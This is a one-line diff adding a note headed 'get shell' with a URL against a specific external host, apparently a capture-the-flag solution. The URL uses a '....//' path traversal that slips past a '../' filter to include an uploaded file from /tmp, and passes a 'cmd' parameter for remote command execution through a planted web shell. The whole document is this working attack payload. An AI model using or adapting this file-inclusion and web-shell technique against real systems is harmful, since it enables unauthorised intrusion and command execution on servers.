@@ -1,0 +1,1 @@
+get shell: http://base64image.splitline.tw:8894/?page=....//....//....//....//tmp/M10915027&cmd={command}
